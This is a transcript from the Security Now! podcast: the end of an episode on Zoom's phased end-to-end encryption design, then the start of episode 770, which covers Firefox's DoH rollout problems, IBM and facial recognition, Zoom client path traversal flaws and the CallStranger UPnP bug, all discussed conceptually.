So the four phases are client key management, identity, a transparency tree, and real-time security.  The transparency tree is what the Keybase guys brought to the party, as we'll see in a second.  So let's look at what they've explained about each of those briefly.  The first phase, they said:  "In the first phase we will roll out public key management, where every Zoom application generates and manages its own long-lived public/private key pair.  Those private keys are known only to the client.  From here, we will upgrade session key negotiation so that the clients can generate and exchange session keys without needing to trust the server."  And we know we've talked often about how that's done.  Diffie-Hellman key agreement, where in total view you're able to look at data going in each direction, allows the endpoints to arrive at a mutually known key, but nobody looking at the data going back and forth is able to derive anything of use.  So that we're able to do.  They'll be adding that in this first phase.



They said:  "In this phase a malicious party could still inject an unwanted public key into the exchange."  So that's a good point.  This is not, because authentication is still weak, the authentication is Phase 2, identity.  So as we know, public key crypto assumes you're exchanging with the right person.  If a man in the middle does a double exchange with each endpoint, then they don't know that they haven't exchanged with the endpoints themselves.  They've exchanged with a man in the middle who now is able to essentially negotiate separate keys with each of them and is able to form a bridge through which to decrypt in the middle.  So again, they're taking this a step at a time, strengthening the infrastructure as they go.



They said:  "We offer meeting security codes as an advanced feature."  And we've talked about this, too, in the past.  "So motivated users can verify these public keys.  The security to be achieved here will approximate those of Apple's FaceTime and iMessage products."  We talked about this.  I think both Threema and - there have been a number of messaging systems where you're able to, over the channel, you're able to say I'm going to - let's verify our fingerprints.  And so each of the endpoints is able to verify the fingerprint, which cuts out, or at least would immediately alert to any man in the middle.  At the moment that's a manual process.  Thus they said "motivated users."  They'll be making it automatic. 



So they said:  "The primary improvement in Phase I is that a server adversary must now become active, rather than passive, to break the protocol.  In Phase I, we will support native Zoom clients and Zoom Rooms.  We will not support web browsers, dial-in phones, and other legacy devices.  There also will be no support for Join Before Host, Cloud Recording, and some other Zoom features."  Anyway, so I had a note here.  I said so Phase I takes them from the current encrypted system where the individual client encryption keys could be captured by a passive observer at the Zoom server to a system where Diffie-Hellman secure key establishment is used to blind a passive observer to the client's session keys.



Phase II, identity.  They wrote:  "In the first phase, clients trust Zoom to accurately map usernames to public keys."  And of course you're also trusting that there's no active attacker.  They said:  "A malicious Zoom server in theory has the ability to swap mappings on the fly to trick participants into entering a meeting with imposters.  In Phase II, we will introduce two parallel mechanisms for users to track each other's identities without trusting Zoom's servers.  For users authenticating to Zoom via single-sign-on, we will allow the single-sign-on identity provider to sign a binding of a Zoom public key to a single sign-on identity, and to plumb this identity through to the UI.  Unless the single-sign-on or the identity provider has a flaw, Zoom cannot fake this identity."



So in other words, that's saying that the UI will be able to attest to the identity of the person on the other end by verifying the signature of the other user's single-sign-on identity provider in order to say, yup, there's no way this isn't the right guy, at least as far as single-sign-on goes.  Or, second, we allow users to track contacts' keys across meetings.  That is, the key should be static over time because it's created once in the client.  They said:  "This way, the UI can surface warnings if a user joins a meeting with a new public key."



And again we've seen, for example, Signal.  You can turn on an alert to be alerted if the user's key ever changes.  It's like, okay, that shouldn't happen.  That could be an active attack.  So this tightens up security in a way similar to other semi-identity-managed messaging systems, like I mentioned Signal and Threema, by remembering previous keys and letting you know if they changed.



Phase III, a transparency tree.  They say:  "In the third phase, we will implement a mechanism that forces Zoom servers and single-sign-on providers to sign and immutably store any keys that Zoom claims belong to a specific user" - basically Zoom becomes a clearinghouse - "forcing Zoom to provide a consistent reply to all clients about these claims."  In other words, in Phase II it was up to the user to verify the key of the other end.  Now Zoom is going to be involved in that.  It will maintain, very much like a certificate transparency log, it will maintain a log of all the keys of all the clients - that is, the public keys, not the privacy keys - and proactively take measures.



They said:  "Each client will periodically audit the keys that are being advertised for their own account and surface new additions to the user."  That is, if something new appears for their account, it's like, wait a minute, somebody is impersonating you.  "Additionally, auditor systems can routinely verify and sound the alarm on any inconsistencies within their purview.  In this scenario, if Zoom were to lie about Alice's keys, say in order to join a meeting which Alice is invited to, it would have to lie to everyone in a detectable way."



They wrote:  "We will obtain these guarantees by building a transparency tree, similar to those used in Certificate Transparency and Keybase.  During this phase we will also provide the capability for meeting leaders to 'upgrade' a meeting to end-to-end encrypted after it has begun, provided that all attendees are using the necessary client versions, and incompatible features are not in use.  Such incompatible features include dial-in phones, IP phone, room systems, and cloud recordings.  Meetings that cannot be upgraded will have the option grayed-out.  We will also reenable 'Join Before Host' mode," allowing people to show up before the host logs in.



And finally, Phase IV, real-time security.  Consider this hypothetical attack against the Phase III design.  A malicious Zoom server introduces a new "ghost" device for Bob, a user who does not have their identity provider vouch for their identity -  I timed that wrong - a new ghost device for Bob, who is a user.  Bob is a user who does not have their identity provider vouching for their identity.  Thus some of the protections that would be available otherwise are not present.



The attacker, using this fake new device, starts a meeting with Alice.  Alice sees a new device for Bob, but does not check the key's fingerprint.  After the fact, Bob can catch the server's malfeasance, but only after the attacker tricked Alice into divulging important information.  The transparency tree encourages a "trust but verify" stance, where intrusions cannot be covered up.



In Phase IV we look to the future, where Bob should sign new devices with existing devices, using a single-sign-on identity provider to reinforce device additions, or delegate it to his local IT manager.  Until one of these conditions is met, Alice will look askance at Bob's new devices.  In other words, if a new unsigned device, one that has not been signed by an existing trusted device, is used, the UI that Alice is seeing will be saying, look, "Bob" is not following the rules here.  We're making no allegations or attestations that this is actually Bob.  You be careful what you say because it may not be, and you've got to have Bob explain why he's using a device that another one of his devices hasn't permitted and authorized and signed.



So they conclude, saying:  "Across these next four phases of security architecture design, we will end up with a state-of-the-art multi-party teleconferencing system which provides robust guarantees of participant identity, takes all key-awareness away from the Zoom infrastructure, and is able to proactively alert any Zoom user when something looks wrong."



Oh, and one thing I noted that I did want to point out about the crypto details was this paragraph.  They said:  "In an ideal world, all public key cryptographic operations could happen via Diffie-Hellman over Curve25519" - my favorite chosen curve - "and EdDSA" - that's Edwards DSA - "over the Edwards25519 curve."  Which of course are the technologies I chose for SQRL, what, seven years ago, eight years ago.



"Relative to the others," they're writing now, they're saying:  "Relative to others, this curve and algorithm family have shown a consistent track record for resilience to common cryptographic attacks and implementation mistakes.  These algorithms are currently in review for FIPS certification; but, unfortunately, are not yet approved.  Therefore, in some cases, like government uses that require FIPS certification, we must fall back to FIPS-approved algorithms like ECDSA and Elliptic Curve Diffie-Hellman over the P-384 curve.  These protocols we use have support for both algorithm families, and for now double-up all public key operations to eliminate error-prone if/then/else branching.  Once certification succeeds, we can safely 'no-op' the operations over P-384 curve."



And I thought, what a clever solution.  What they're saying there is, since the operations where these are being used are inherently not time sensitive, they're one-time setup things, and they're only being used to establish keys and identities, why not use both the 25519 and P-384 curves in series?  Then, once 25519 has been shown to be sufficient, simply drop the P-384 out of the chain by no-opping it, and you're left with the curve that you trust, and you don't need to worry about implementation mistakes in P-384 mucking up the whole crypto.



So nice piece of engineering.  I think what they're doing makes total sense.  And it's clear to any observer that Zoom is absolutely serious about offering users continuing the same ease of use, but incrementally taking increasing responsibility for making the system much more bulletproof behind the scenes.  End users won't notice any difference.  It will continue to operate just as it did before.  But they will be notified when anything screwy might be happening.  So hats off to these guys and to this team that has put this together.



LEO:  Do they give an ETA for when this will be implemented?



STEVE:  There's no timing at all.



LEO:  This is just a proposal, then.



STEVE:  Yeah.



LEO:  But of course you've got the best crypto guys in the world there, so I'm sure it's all well thought-out and very sound.



STEVE:  And they don't have to invent anything.  All of this is just applying well-known crypto to solve the particular problem that they have.



LEO:  I mean, I can see it if it's a one-to-one call.  That's trivial.  That's like messaging.  That's like Signal.  But I thought it was difficult to do a one-to-many call or many-to-many call because you had to, at the server point, decrypt; right?



STEVE:  I'm stunned, Leo.  Maybe that's why they specifically said not for webinars, but for meetings up to a thousand.  You're talking about a 1,000-way encryption.  Because you've got to encrypt every key pair to every other user.  It's like, yo, ho.  Boy.  



LEO:  So at the control point there's no need for the control point to have a decrypted version.  They can route it all based on the crypto keys.  And that's all they really need; right?  Yeah.



STEVE:  Right.



LEO:  Yeah, that makes sense.  It's just a lot of keys.  It's a lot of management.



STEVE:  Well, it's a lot of streams.  It's not one stream going up just to headquarters and then being sent back out.



LEO:  Oh, that's a good point, yeah.



STEVE:  It is a thousand streams from every user, or 999 from every user to all other 999.



LEO:  I don't know if that's how they do it normally anyway, or if they try to save bandwidth by aggregating and doing broadcasts?



STEVE:  I think it's the way they've been doing it, interestingly.



LEO:  Yeah, I think it is, yeah.



STEVE:  Because they have done end to end, but it was just with keys that the server could know about.



LEO:  Right.  Well, and that's what I thought is that the server needed to know about it to do the routing.  But I guess not.



STEVE:  Yeah.  Well, the good news is symmetric crypto is what you're using with the key.  And symmetric crypto is fast. 



LEO:  Yeah, it's a lot easier.



STEVE:  And using AES-GCM doesn't slow it down at all.



LEO:  Right, right.



STEVE:  So it's all, you know, and now Intel chips have AES acceleration in them.



LEO:  Right.



STEVE:  They actually have three or four instructions that, like, make the most time-intensive bit-twiddling bit just instant.



LEO:  That's cool.  That's really good.



STEVE:  Yeah, very.



LEO:  Steve, as always, fascinating stuff.  This is a show everybody needs to listen to every week.  We do Security Now! on Tuesdays, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  You can watch live.  I mean, you don't need to.  But if you wanted to, or you're just around on a Tuesday afternoon/evening, just go to TWiT.tv/live.  That's where the audio and video streams are aggregated.  You can pick one you like.  They are not encrypted.  You don't need a key.  They're just wide open.  We want everybody to see them.  If you're doing that, join us in the chatroom, also not encrypted, at irc.twit.tv.  That's a great place to be.



If you're going to watch after the fact, there's a couple places to get your shows.  You can get them from Steve.  He's got 16Kb audio for the bandwidth-impaired, 64Kb audio, and he has transcripts.  That's the one place you can get those really well-done transcripts from Elaine Farris.  That's GRC.com.  While you're there, check out the place.  There's lots of free stuff.  It's an amazing site.  Easy to get lost, fall down a rabbit hole.  So plan some time as you visit GRC.com.  Steve is also on Twitter at @SGgrc.  So if you want to message him, that's the best place to do it.  You can DM him.  His DMs are open, @SGgrc on Twitter.  Or leave a feedback at the feedback form on the website, GRC.com/feedback.



We have audio and video at our site, TWiT.tv/sn.  You can also see the show on YouTube.  Best thing to do would be to subscribe.  Get a good podcast app.  There's lots of them out there, not labeled TWiT, just things like Pocket Casts and Stitcher and Slacker and Overcast, and Google and Apple have podcast apps.  And subscribe.  Just say Security Now!, I want it every week.  That way it'll be on your device, and you can listen at your convenience, whenever you get a moment, a free moment.



Thanks, Steve.  Have a wonderful week.  Stay safe and healthy.  We'll see you next week on Security Now!.



STEVE:  Right-o.  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.


GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#770

DATE:		June 9, 2020

TITLE:		Zoom's E2EE Debacle

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-770.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we take an interesting new look at some new problems arising with DoH; we look at IBM's new stance on facial image recognition research; we look at two recently disclosed flaws in the Zoom client; we check on the severity of the latest UPnP service flaw; and we update on Microsoft's new Edge rollout.  We share a bit of miscellany and some terrific feedback from our listeners, touch on my SpinRite project progress, and then explore last week's truly confusing Zoom encryption reports that give the term "mixed messaging" a bad name.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We'll talk about the DoH DoS.  We also talk about IBM abandoning face recognition technologies and the weird story about Zoom's encryption.  Is it, or isn't it?  Steve parses the statements, next.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 770, recorded Tuesday, June 9th, 2020:  Zoom's E2EE Debacle.



It's time for Security Now!, the show where we talk about the latest news in security.  We get you some help from this guy right here.  He's the security guru, the king, Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Yo, Leo.  Wow, 770 episodes.  



LEO:  No.  I have 740.  Oh, you're right.  I've got to fix this, too.  Whoops.  Thank you for correcting.



STEVE:  Glad I happened to make a note of that, since we want the proper lower third down there.



LEO:  Is that a magic number?



STEVE:  And this is 2020, by the way, Leo.



LEO:  Oh, good.  Okay.  We've got the date right.



STEVE:  We have June 9th, 2020.



LEO:  Okay.  The day's right.  Just the episode wrong.



STEVE:  So we went from last week's podcast, Zoom's E2EE Design, now to Zoom's E2EE Debacle.



LEO:  Yeah, that was quick, snatching defeat from the jaws of victory, so to speak.



STEVE:  I cannot wait to get to the end of the podcast because what happened last week, you've just got to scratch your head and say, what?  Who?  What?  Huh?  Anyway, we'll see why.  But before that we're going to take an interesting new look at some  new problems that might be arising with DoH, making it much more like "doh" than we thought.  Something happened last week with Firefox when it unleashed DoH onto NextDNS that wasn't happy.



We're also going to look at IBM's new stance on, and I'm happy about this, facial recognition research.  We're going to look at two recently disclosed flaws in Zoom's client, which is separate from the debacle.  You can have a mistake, and you have a policy.  We always are careful to separate those.  We're going to check on the severity of the latest, yes, once again, we're back to UPnP...



LEO:  Oh, no.



STEVE:  ...with a flaw.  Oh, yeah.  And the tech press is hyperventilating again.  We're also going to update on Microsoft's new version of Edge, its rollout.  We've got some miscellany, just a couple grc.sc shortcuts I want to share relating to the COVID stuff and where we are.  We also have some terrific feedback from our listeners.  I'm going to touch on the recent progress since last week on SpinRite project.  And then we're going to look at last week's truly confusing Zoom encryption reports that give the term "mixed messaging" a bad rap.



LEO:  Oh, man.  



STEVE:  Yeah.  And we do have a fun Picture of the Week.  So I think another great podcast.



LEO:  We have that all still to come.



STEVE:  770.



LEO:  Yes.  I fixed the number; right?  It looks good now?



STEVE:  Okay.  We're in agreement now on the episode number.



LEO:  I'm glad you mentioned that.



STEVE:  So our Picture of the Week is not about security directly.  Even, yeah, really not at all.  I just liked it.  It was just fun.  It came to me, and I wanted to share it with our listeners.



LEO:  This is the story of your life.



STEVE:  Yeah.  Yeah, exactly.  So I gave it the caption "It's been a weird year."  And this is a time graph that labels itself "Relative Importance in 2020, So Far."  And there are a number of items.  It goes January, February, March, and April.  And so one of the items is coffee.  And that's a straight line across the top.  We needed it before all this craziness, still need it now.  The curve for car has of course dropped off dramatically.  We were using our cars a lot at the beginning, not so much now.  Internet goes up from where it was, up like right up near the top.  And around the beginning of March the line for shaving, which was a straight line across, drops down to zero.



LEO:  Plummets.



STEVE:  Yeah, don't need to do that so much.  The real funny one, actually, is alcohol, which is moving along on a straight line until March.  Then not only does it go up, but it goes off the top of the chart through the title and off the screen.  So, uh-huh.  And then of course there was that weirdness about toilet paper, so it represents that with a slightly trending upward line that suddenly jumps up to the top for a while, then comes back down where it was before.  Sweatpants is the final parameter that is tracked, and it shows a mild increase, just sort of going up over time to where we are now.  So anyway, just sort of a wacky, fun little bit of, as I said, it's been a weird year in our lives.  And it's - yeah.



LEO:  It's not over yet, either.



STEVE:  No, it's not over yet.  So we start this week with a bit of browser news, the odd case of Mozilla's DoH DDoS.  The Mozilla team was busy last week.  Tuesday they released their brand new shiny next Firefox, Firefox 77.  When we were talking last week, we were on 76, and that was brand new and shiny.  But no, now we had 77.  That was of course for the desktop versions, Windows, macOS, and Linux.  It fixed several security issues.  Five vulnerabilities received a high severity score, with three of them allowing bad actors to run arbitrary code on vulnerable installations.  Not what you want in your browser, so those are gone.



As Mozilla puts it, a flaw classified as high in severity, "can be used to gather sensitive data from sites in other windows, or inject data or code into those sites, requiring no more than normal browsing activities."  So those got fixed.  77 also further rolled out Mozilla's WebRender project, which we've not spoken of before.  WebRender is their new and emerging RUST-written 2D graphic web renderer for their browser which can be used on any NVIDIA-equipped Windows 10 machines, currently laptops, having screens of any size.  For a while it was size limited.  It was less coverage.  They're thinking, hey, you know, browsers are doing lots of 2D stuff.  Now GPUs are just present.  And I think they're targeting laptops because they're also power sensitive.  And so you might as well use an application-specific IC, namely a GPU, to do this stuff.



And, now, we've talked about the insane rendering that browsers are now doing.  I mean, we sort of take it for granted.  But there's, like, fading effects, and things are, I mean, I'm seeing stuff where, as you scroll the page up, things kind of emerge from the mist, or they suddenly expand to full size, I mean, all that's being done browser-side.  And that all requires cycles.  If you're having to do that in a general purpose processor, it's having to work a lot harder than if you're able to use a processor that, for example, just automatically has the ability to do multilayer opacity masking and mapping and all that.  So that's what they're doing, more of that now in 77.  It's looking like this project is going to be a success. 



However, shortly after the release of Firefox 77, things quickly went sideways.  Taking a piece of this week's listener feedback out of sequence, because I originally had it down, because I thought it was interesting, down in listener feedback, later in the podcast.  And I thought, oh, this just pops to the front now.



Chris Miller, who tweeted from @Mil_Fi, he sent:  "Hello, Steve.  Longtime listener of Security Now!.  Just want to let you know about something.  I work for a fairly large county government.  We have all internal users," he says, "6,000+, go through a proxy server for security."  Good.  He says:  "Well, our proxy was overwhelmed yesterday with anything going through it.  It turned out that DoH was automatically enabled on just a few of those users who had upgraded to Firefox 77," he says in parens, "(fewer than 10), and it completely crippled us."



He says:  "Firefox is not a browser that many in our environment use, either."  He says:  "I also read the links below and saw that DoH basically overwhelmed NextDNS, the secondary provider in Firefox.  Now, Mozilla appears to be slowing down its rollout tremendously.  I guess the load is so much more on existing systems.  Just thought you'd like to know.  I'm sure other enterprises will be experiencing a similar issue."  Well, and not only did other enterprises experience it, NextDNS was effectively DDoSed by the rollout of Firefox 77, which for the first time fully enabled DoH on that browser.  So indeed, Chris was right.



LEO:  Were they the default?  Or was Cloudflare the default?  Who was the...



STEVE:  I'm not sure, like, what the logic was.  Maybe they were choosing them randomly.  But NextDNS is the second-listed provider, and it buried them.



LEO:  Oh, wow.



STEVE:  So they immediately stopped the 77 rollout and replaced it with 77.0.1, which is what anyone who is current will now have.  Okay, so what happened?  Interestingly, the exact details are surprisingly thin.  I was really interested, so I dug around a lot.  Over on Bugzilla, which of course is Mozilla's bug tracking site, only two incomplete and somewhat cryptic explanations are found.  One is "Disabled automatic selection of DNS over HTTPS providers during a test to enable wider deployment in a more controlled way."  And the second is "We need to be able to roll this out gradually so that we don't overload any providers.  Even the dry run involves up to seven requests per client, which can be very significant when the entire release population updates."



So here's one thing that may be going on.  Web servers are not super happy with long-duration persistent connections of the type that DoH defines and requires for performance which is intended to compete with traditional UDP.  And of course nobody wants less performance from their browser if they switch to DoH.  Yeah, hey, if the security and privacy is free, I'll take it.  But not if it slows down my pages.



So it turns out I ran across exactly this problem a few years ago at one phase of the SQRL project.  We wanted a SQRL login site's web page to automagically update once the user had logged on, either optically with their phone, which would see the unique QR code on the page, or with a SQRL client installed into the same machine.  And that's what it does; right?  In all the demos of SQRL, it's just like, ooh, click, and you're logged in.  It's magic.



So there are two ways this could be done from within the web page:  Either have JavaScript on that page bring up one persistent connection back to the website by having the page connect back to the server and wait for a signal to refresh the page, or sit in a loop periodically and continuously probing the website to ask whether that page should be updated.  I initially took the first approach since that seemed much cleaner; right?  Set up and camp out on one connection and wait for word from the server.  Also it would be quicker.  You wouldn't be waiting for like the next ping to come back with an answer.



So I brought that solution online, and the gang in the GRC SQRL newsgroup began playing with it.  And I quickly became aware and came to appreciate just how much web servers are designed to be inherently transactional.  They want to field many short-lived connections; return the data; and, if there's nothing else, hang up the connection.  Having many connections all churning is no problem, but they should be coming and going rapidly.  In this case, the long-term static connections were making GRC's web server very unhappy.



Back in the early days of this podcast we talked about the old-style DoS attack, not DDoS, just DoS.  And in that simple DoS (Denial of Service) attack, a single low-bandwidth attacker could bring down a beefy website simply by sending a stream of TCP SYN packets.  Every incoming SYN packet was a request to establish a new TCP connection.  So the server would jump to action upon receiving each SYN packet.  It would allocate some resources to manage that nascent connection.  It would record the sequence number.  That's what SYN, the sequence, that's what SYN of SYN packet stands for because it's the client saying, when I send you things, let's start numbering the bytes with this sequence number, which is a 32-bit value.



So the server would record that sequence number provided by the remote client in its nascent connection structure.  Then it would generate its own sequence number to number its own replies or transmissions and record any other connection-specific details provided by the caller.  Then it would finally generate and send back its own answering SYN/ACK packet, which was acknowledging the SYN received and also sending its sequence number back to the client.  And if no answering ACK was received, it would assume that the reply was lost, so it would retry that several times.



The point is all of that effort and allocated resource was forced upon the server side by someone simply and mischievously sending a single SYN packet or, practically, a stream of short and simple SYN packets.  So in my case, with SQRL, everyone who was sitting at a SQRL login page had established a persistent connection to my server, and it ended up being seriously overburdened.  So I changed the login page's logic to instead issue the equivalent of a TCP ping, a query for a named object that would immediately generate a reply and disconnect.  And I never had another problem since because that's the way web servers are designed.



So what's interesting, I mean, no one's talking about this.  I've looked everywhere.  I haven't found anything further.  But the potential trouble with DoH is that it, too, inherently relies upon the maintenance of a persistent static TCP/TLS connection across which occasional DNS query flurries will transit.  As our web browsers begin using DoH, every single browser that's open will establish and maintain a static TCP/TLS connection back to its chosen DoH provider.  So I sure hope that this has been given due consideration by those who wish to move us to DNS over TCP because it's a different ballgame.



The traditional DNS, as we know, that we've always been using, is the lightest weight query we know how to make - a single, isolated, no-connection-required UDP query packet, and a returning UDP response.  So no matter what, we are heading toward a solution that is a great deal more burdensome on DNS providers than UDP has ever been.  Even though that connection still only transits the equivalent of UDP DNS queries, the fact that you have that connection, you know, you're getting authentication, you're exchanging an identity certificate, you're verifying the certificate, you're bringing up encryption,  there's a lot more.



But all of that means that, for every single browser open, there's a connection back to a DoH provider.  And that's a different ballgame.  I don't know about you, Leo.  I run with one or more browsers open just like, you know, it's my portal to the world.



LEO:  Oh, yeah, it's always open, yeah.



STEVE:  Exactly.



LEO:  I think some machines it's auto start.  It loads at the boot.



STEVE:  Yeah, yeah.



LEO:  That's really interesting.  And there'll be a connection for each page you go to, as well; right?



STEVE:  No.



LEO:  So if you have a hundred tabs - oh, just one persistent connection.



STEVE:  Right.



LEO:  Okay.



STEVE:  So it'd be one persistent connection.  And as we know, when you open like a New York Times page, it's a mass...



LEO:  It's a whale.



STEVE:  ...of DNS queries that are going out for all of the different sources of content on that page.



LEO:  Right.



STEVE:  I mean, it's hundreds of different domains that are involved.  And that's fine.  We do that now over UDP.  The problem is something happened with Firefox that basically, well, it melted down that one corporate proxy that I shared from one of our listeners.  And it brought NextDNS to its knees.  It DDoSed them.  So it wasn't from queries.  It had to have been from connections.  And because that model is so different, I don't know what they're going to do.  I mean, they're going to need a, you know, back then when we were talking about SYN DDoSes, there was something known as a SYN cookie.  And actually Daniel Bernstein and I independently invented it.  He preceded me by some years.  I wasn't aware of it when I thought, there's got to be a solution to this.



And the idea was you could do a stateless TCP connection.  But it's stateless only until the far end, the client, responds with a SYN/ACK or an ACK in response to your SYN, thus finishing the three-way handshake and establishing the connection.  At that point, you still need - it's a resource-consuming thing to maintain a TCP connection.  So again, it may mean that the DoH providers are going to have to come up with much beefier servers that are able to - we're talking, what, millions of connections.  I mean, how many browsers are there that could be open at the same time?  That's a lot.



And so it's way different than just UDP, little UDP packets whisking in and out as people change pages.  So you still have that now over TCP, but that TCP is always up.  And it has to be because you can't afford the connection setup every time you refresh a page or change tabs or bring up a new page.  The point is you establish that static connection, and it persists.  And it looks like it's bringing down our DoH providers.



LEO:  Maybe this wasn't such a good plan.



STEVE:  Right.



LEO:  Seemed like a good idea at the time.



STEVE:  Yeah, it did.  You know, it always struck me as a little bit kind of homebrewed.



LEO:  Little janky, yeah.



STEVE:  Like oh, yeah.  Like there ought to have been a better way to encrypt the DNS queries, rather than just basically set up a VPN is the equivalent of what you're doing.  Every browser now has a VPN connection because that's what it is.  Although even VPNs are smart enough to do that over UDP because it's better.



LEO:  Right.



STEVE:  So anyway, we have a nice bit of news from IBM's CEO, Arvind Krishna.  He sent a letter to Congress via Axios and CNBC, which was an odd path for it to take, but I guess he thought he'd get a little bit of PR for IBM in the process.  It stated that the company, IBM, has willfully exited its general purpose facial recognition business.  I'm quoting the letter in the show notes.



He said:  "IBM no longer offers general purpose IBM facial recognition or analysis software.  IBM firmly opposes and will not condone uses of any technology, including facial recognition technology offered by other vendors, for mass surveillance, racial profiling, violations of basic human rights and freedoms, or any purpose which is not consistent with our values and principles of trust and transparency.  We believe now is the time to begin a national dialogue on whether and how facial recognition technology should be employed by domestic law enforcement agencies."



He continues:  "Artificial Intelligence is a powerful tool that can help law enforcement keep citizens safe.  But vendors and users of AI systems have a shared responsibility to ensure that AI is tested for bias, particularity when used in law enforcement, and that such bias testing is audited and reported."  He says:  "Finally, national policy also should encourage and advance uses of technology that bring greater transparency and accountability to policing, such as body cameras and modern data analytics techniques."



So that's good.  CNBC noted that it's relatively easy for IBM to back out when facial recognition wasn't a major contributor to its bottom line.  But, you know, certainly the media buzz may be as important as anything.  IBM is still a major company, and it frequently works with governments.  So this could spur some providers to follow suit, and might even get some would-be customers to drop facial recognition entirely.  We'll have to see how this goes.



And of course, while some facial recognition systems may only correlate faces with publicly available data, that's what what's-their-face AI, I'm blanking on the name now [Clearview AI], the one we've been talking about all the time, you know, they're only doing public scraping of stuff; but still we've seen that it's not what people expect.  It's not sort of the inherent sense of privacy from sharing a photo with friends on social media.  You don't expect it to be hoovered up into a database and cross-referenced and have all the people's faces in it identified and tagged and associated in creating a big interlinked web of who knows who.



So anyway, I'm delighted with the attention that this topic is generating.  We do need to talk about this.  As we know, and we've said before, just because we can do something doesn't always mean that we should.



Meanwhile, I'm always amazed at companies that are looking at each other's products.  And I'm glad for it.  I'm glad that the security companies are taking it upon themselves to poke into other things and then responsibly disclose them.  In this case, Cisco's Talos group found two critical flaws in the Zoom client.  And that's interesting to me because Cisco is a big Webex provider.  Anytime I'm seeing video of talking heads on CNN, they have got some sort of deal with Cisco's Webex because it advertises and brands all of their video conferences as Cisco Webex.



Anyway, we'll be talking, as we know, later about last week's mega Zoom policy issues at the end of the podcast.  But in the meantime there was a problem with the latest Zoom client such that you're going to be wanting to make sure you're running the latest one.  The researchers in Cisco's Talos group revealed last Wednesday that they had discovered two critical vulnerabilities in Zoom's software that could have allowed attackers, and could still if you haven't updated, to remotely hack into the computers being used by group chat participants or an individual recipient.  Both flaws are - wait for it - path traversal vulnerabilities.  One of the others we keep...



LEO:  Not again.



STEVE:  Can you say dot dot backslash dot dot backslash dot dot.  And even forward slash, as we learned a couple weeks ago.  Yes, path traversal vulnerabilities that can be exploited to write or plant arbitrary files on the systems running vulnerable versions of Zoom video conferencing, allowing it to execute malicious code.  According to the researchers, successful exploitation of either of the two flaws requires either none or very little interaction with targeted chat participants, and can be executed simply by sending a specially crafted message through the chat feature to an individual or a group.  So essentially, it was a built-in remote nuke.



The first vulnerability, CVE-2020-6109, resided in the way Zoom leverages the GIPHY service which was recently acquired by Facebook to allow its users to search and exchange animated GIFs while chatting.  Researchers found that Zoom was not checking whether or not a shared GIF was loaded from the GIPHY service.  This allowed an attacker to embed GIFs from a third-party attacker-controlled server, which are then cached and stored on the recipient's system in a specific folder assigned with the application.  But since the Zoom app was not sanitizing the filenames, attackers could perform directory traversal to save the malicious files disguised as GIFs to any location on the victim's system, for example in the startup folder, where they would then get executed next time the person started up their machine.



LEO:  Wow.



STEVE:  So good thing that's fixed.  The second remote code execution vulnerability, and that's 6110, resided in the way vulnerable versions of the Zoom application process code snippets shared through chat.  Cisco wrote, and this is interesting:  "Zoom's chat functionality is built on top of the XMPP standard, with additional extensions to support the rich user experience."  Unfortunately, it was a little richer than they had intended.



"One of those extensions supports a feature of including source code snippets that have full syntax highlighting.  The feature to send code snippets requires the installation of an additional plugin, but receiving them does not.  This feature is implemented as an extension of file sharing support," wrote Cisco.  So this feature creates a zip archive of the shared code snippet before sending, and then automatically unzips it on the recipients system.



And according to the researchers, Zoom's zip file extractor does not validate the contents of the zip archive before extracting it.  This allows the attacker to plant arbitrary binaries onto targeted computers.  Cisco wrote:  "Additionally, a partial path traversal issue allows the specially crafted zip file to write files outside of the intended randomly generated directory," thus bypassing a mitigation that Zoom had put into place, rendering it ineffective.



The researchers tested both flaws on version 4.6.10 of the Zoom client app and responsibly reported it to the company.  Last month, Zoom patched both critical vulnerabilities with their release of version 4.6.12 for Windows, macOS, and Linux.  And as we have observed before, anyone can make a mistake.  Those were that.  They quickly fixed them upon being notified.  While we might wish for perfect software, no one is willing to pay what perfect software would cost.  So instead, we muddle through with software that mostly works and fix problems as they come to light.  It's not a perfect system, but it's the one we have.



So yesterday, on June 8th, the Internet's tech press blew up over the disclosure of yet another newly discovered vulnerability in UPnP.  Big surprise.  Headlines took the form, for example, ZDNet:  "CallStranger vulnerability lets attackers bypass security systems."  BleepingComputer's headline:  "CallStranger UPnP bug allows data theft, DDoS attacks, and LAN scans."  And Tenable had the longest headline:  "Universal Plug and Play (UPnP), a ubiquitous protocol used by billions of devices, may be vulnerable to data exfiltration and reflected amplified TCP distributed denial of service attacks."  Whoa.



Since our listeners may be encountering these dire and breathless warnings in coming days, I wanted to take a moment to explain what's going on and what isn't, especially because most of the coverage is as unclear as the vulnerability's website, which naturally and predictably makes quite a big deal about it.  It's CallStranger.com.  So remember that the early problems with UPnP arose from the fact that a sample implementation code made available by Intel back in the year 2000 - 20 years ago, two decades ago - which was quite clearly marked "Sample" was never intended to be implemented in the field.  But Intel posted a sample of here's how you do UPnP.  So many, if not all of the vendors back then...



LEO:  Of course.



STEVE:  ...grabbed that source code.



LEO:  Why [crosstalk] yourself when you can just [crosstalk].



STEVE:  That's right.  You could just, you know, you didn't even have to comment out "Sample" because it was already commented.  They compiled it for their chipsets, added it to their routers, and then added a UPnP-compatible bullet point to their router's feature checklist.  And so during the 20 years since, we've had many problems that are directly attributable to that original publication of never-claimed-to-be-ready-for-use code.  In fact, our own episode 389, I think it was 2016, or maybe earlier than that, it resulted in me adding a public UPnP exposure test to GRC's ShieldsUP! facility.  And since then, I checked this morning, 54,954 tests have come back positive for public UPnP exposure.



Okay, now, remember, it's never supposed to be publicly exposed.  The idea was that it was a way for things that wanted to be discoverable on your LAN, like famously an Xbox, to solve the problem, well, such as it is a problem, of NAT routers being wonderful firewalls.  You know, they're wonderful firewalls.  They will not accept incoming unsolicited traffic except unless you have an Xbox and you want, you need to be able to accept incoming unsolicited traffic in order to participate in whatever it is that Xbox gamers participate in.  Some network of some kind.



